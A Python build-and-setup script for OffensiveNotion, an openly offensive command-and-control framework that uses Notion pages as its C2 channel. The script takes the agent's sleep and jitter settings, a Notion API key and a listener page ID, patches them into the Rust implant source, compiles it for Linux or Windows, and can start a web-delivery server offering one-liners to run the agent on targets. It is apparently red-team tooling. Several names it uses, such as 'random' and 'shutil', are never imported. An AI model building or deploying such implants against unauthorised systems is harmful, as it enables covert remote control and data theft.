#!/usr/bin/env python3
import os
import argparse

import subprocess as sub
from shutil import copyfile, move, rmtree

import utils
from utils.colors import *
from utils.inputs import *
from utils.file_utils import *
from utils.c2_linter import *
from utils.web_delivery import *
import getpass
import json
import signal
import sys

parser = argparse.ArgumentParser(description='OffensiveNotion Setup. Must be run as root. Generates the '
                                             'OffensiveNotion agent in a container.')
parser.add_argument('-o', '--os', choices=['linux', 'windows'], help='Target OS')
parser.add_argument('-b', '--build', choices=['debug', 'release'], help='Binary build')
parser.add_argument('-c', '--c2lint', default=False, action="store_true", help="C2 linter. Checks your C2 config "
                                                                               "by creating a test page on your "
                                                                               "Listener.")
parser.add_argument('-w', '--webdelivery', default=False, action="store_true", help="Start a web delivery server to "
                                                                                    "host and deliver your agent. "
                                                                                    "Provides convenient one liners "
                                                                                    "to run on the target.")
parser.add_argument('-m', '--method', choices=['powershell', 'wget-linux', 'wget-psh', 'python-linux', 'python-windows'], help='Method of web delivery')
parser.add_argument('-ip', '--hostIP', help='Web server host IP.')
parser.add_argument('-p', '--port', help='Web server host port.')

args = parser.parse_args()

# Globals
curr_dir = os.getcwd()
config_file = curr_dir + "/config.json"
bin_dir = curr_dir + "/bin"
agent_dir = curr_dir + "/agent"
dockerfile = curr_dir + "/Dockerfile"

def print_logo():
    logo = Fore.CYAN + """
   ____   __  __               _           _   _       _   _             
  / __ \ / _|/ _|             (_)         | \ | |     | | (_)            
 | |  | | |_| |_ ___ _ __  ___ ___   _____|  \| | ___ | |_ _  ___  _ __  
 | |  | |  _|  _/ _ \ '_ \/ __| \ \ / / _ \ . ` |/ _ \| __| |/ _ \| '_ \ 
 | |__| | | | ||  __/ | | \__ \ |\ V /  __/ |\  | (_) | |_| | (_) | | | |
  \____/|_| |_| \___|_| |_|___/_| \_/ \___|_| \_|\___/ \__|_|\___/|_| |_|
    """
    centered = int((len(logo)/6)/2)
    pad = "-"
    catchphrase = ["But, Why?", "Because reasons!", "I find the very notion offensive.", "KEKW", "The absolute madlads", "NEW. TECH."]
    tag = random.choice(catchphrase)
    creators = "mttaggart | HuskyHacks"

    len_tag = len(tag)
    padding = (pad * (centered - int((len_tag)/2)-1))
    space = " "
    spaces = (space * (centered - int((len(creators))/2)))

    print(logo)
    print(padding + tag + padding)
    print(spaces + creators + "\n" + Fore.RESET)

# Are you root?
def is_root():
    """
    Checks if the user is running the script with root privs. Exits if this is not the case. Root privs are needed to
    set up the Docker container used for compiling the agent.
    """
    if os.geteuid() == 0:
        return
    else:
        print(important + "You need to run this script as root!")
        parser.print_help()
        exit()


# Is docker installed?
def check_docker():
    """
    Checks if Docker is installed, exits if it is not.
    """
    print(info + "Checking Docker...")
    try:
        p = sub.Popen(['docker --version'], shell=True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE)
        out, err = p.communicate()
        if p.returncode == 0:
            print(good + "Docker is installed!")
        elif p.returncode > 0:
            print(
                important + "Docker is not installed. Make sure to install Docker first (on Kali/Ubuntu, run: sudo apt-get "
                            "install docker.io -y)")
            exit(1)
    except Exception as e:
        print(str(e))
        exit(1)


# Is there a config file?
def does_config_exist() -> bool:
    """
    Checks for the config file, returns a bool value.
    """
    print(info + "Checking config file...")
    config_file_exists = os.path.exists(config_file)
    if not config_file_exists:
        print(info + "No config file located")
        return False
    else:
        print(good + "Config file located!")
        return True


def take_in_vars():
    """
    Intakes vars for Sleep, Jitter Time, API Key, and Parent Page ID.
    """
    # Sleep
    sleep_interval = ask_for_input(
        important + "Enter the number of seconds for the agent's sleep interval [default is 30][format: #]", "30")
    print(good + "Sleep interval: {}".format(sleep_interval))
    # Jitter Time
    jitter_time = ask_for_input(
        important + "Enter the number of seconds for the agent's jitter range [default is 10][format: #]", "10")
    print(good + "Jitter range: {}".format(jitter_time))
    # Log Level
    log_level = ask_for_input(
        important + "Enter the logging level for the agent (0-5) [default is 2][format: #]", "2")
    # API Key
    api_key = getpass.getpass(important + "Enter your Notion Developer Account API key [will be concealed from terminal]> ")
    print(good + "Got your API key!")
    # Parent Page ID
    print(
        "\n" + important + "Your notion page's parent ID is the long number at the end of the page's URL.\n[*] For example, "
                           "if your page "
                           "URL is '[https://]www[.]notion[.]so/LISTENER-11223344556677889900112233445566', then your parent "
                           "page ID is "
                           "11223344556677889900112233445566\n")
    parent_page_id = input(important + "Enter your listener's parent page ID > ")
    print(good + "Parent page ID: {}".format(parent_page_id))
    json_vars = {
        "SLEEP": sleep_interval,
        "JITTER": jitter_time,
        "API_KEY": api_key,
        "PARENT_PAGE_ID": parent_page_id,
        "LOG_LEVEL": str(log_level)
    }
    json_string = json.dumps(json_vars)
    return json_string


def read_config():
    with open("config.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
    print(recc + "Your configs are: ")
    for k, v in data.items():
        if k == "API_KEY":
            print(r"    [*] {}: [REDACTED]".format(k))
        else:
            print(r"    [*] {}: {}".format(k, v))
    return data


def write_config(json_string):
    with open('config.json', 'w') as outfile:
        outfile.write(json_string)


def are_configs_good() -> bool:
    res = utils.inputs.yes_or_no(important + "Do these look good? [yes/no] [default is yes] > ", "yes")
    return res


# When the configs look good:

def copy_source_file():
    print(info + "Creating agent's config source code...")
    source_dir = agent_dir + "/src/"
    src = source_dir + "config.rs"
    dst = source_dir + "config.rs.bak"
    copyfile(src, dst)


def sed_source_code():
    print(info + "Setting variables in agent source...")
    source_file = agent_dir + "/src/config.rs"
    f = open("config.json")
    data = json.load(f)
    for k, v in data.items():
        utils.file_utils.sed_inplace(source_file, "<<{}>>".format(k), v)


def set_env_vars():
    print(info+ "Setting env vars...")
    f = open("config.json")
    data = json.load(f)
    for k, v in data.items():
        os.environ["{}".format(k)] = "{}".format(v)


def recover_config_source():
    print(info + "Recovering original source code...")
    old_conf = agent_dir + "/src/config.rs.bak"
    curr_conf = agent_dir + "/src/config.rs"
    exists = os.path.isfile(old_conf)
    if exists:
        try:
            os.remove(curr_conf)
            move(old_conf, curr_conf)
        except Exception as e:
            print(printError + str(e))


def c2_lint(json_string):
    print(info + "Checking your C2 configs...")
    c2_check = utils.c2_linter.create_page(json_string["API_KEY"], json_string["PARENT_PAGE_ID"])
    if c2_check:
        print(good + "C2 check passed! Check your Notion notebook for a C2_LINT_TEST page.")
    else:
        print(printError + "C2 check failed. Check your config.json file.")


def run_web_delivery():
    utils.web_delivery.main(args.hostIP, args.port, args.method, args.os, args.build)


def main():
    print_logo()
    is_root()

    # Config file checks
    configs = does_config_exist()
    if not configs:
        print("[*] Lets set up a config file")
        json_vars = take_in_vars()
        write_config(json_vars)

    json_vars = read_config()
    # C2 Lint
    if args.c2lint:
        c2_lint(json_vars)
    looks_good = are_configs_good()

    while not looks_good:
        # This could definitely use some work, seems sloppy
        json_vars = take_in_vars()
        write_config(json_vars)
        json_vars = read_config()
        if args.c2lint:
            c2_lint(json_vars)
        looks_good = are_configs_good()
    print("[+] Config looks good!")

    try:
        try:
            shutil.copyfile("config.json", "/out/config.json")
            set_env_vars()
            # copy_source_file()
            sed_source_code()
        except Exception as e:
            print(printError + str(e))

        os.chdir("agent")

        # The subprocess needs the env var, so we'll set it, along with the
        # rest of the env here
        new_env = os.environ.copy()

        # Run cargo. The unstable options allows --out-dir, meaning the user
        # Can mount a folder they select as the destination for the compiled result
        # Parameterizing the cargo build command

        if args.os == "windows":
            os_arg = "--target x86_64-pc-windows-gnu"
        else:
            os_arg = ""
        if args.build == "release":
            build_arg = "--release"
        else:
            build_arg = ""


        sub.call(
            ["cargo build -Z unstable-options --out-dir /out {} {}".format(os_arg, build_arg)], shell=True,
            env=new_env
        )

        # This will make an additional target folder, so blow it away
        # in the event it was on the mounted drive
        rmtree("target")

        try:
            recover_config_source()
        except Exception as e:
            print(printError + str(e))

        if args.webdelivery:
            try:
                run_web_delivery()
            except Exception as e:
                print(printError + str(e))
                exit()
        else:
            print(good + "Done! Happy hacking!")
    except KeyboardInterrupt:
        print(recc + 'Cleaning up and exiting...')
        recover_config_source()
        print(recc + "Goodbye!" + Fore.RESET)
        sys.exit(0)


if __name__ == "__main__":
    main()
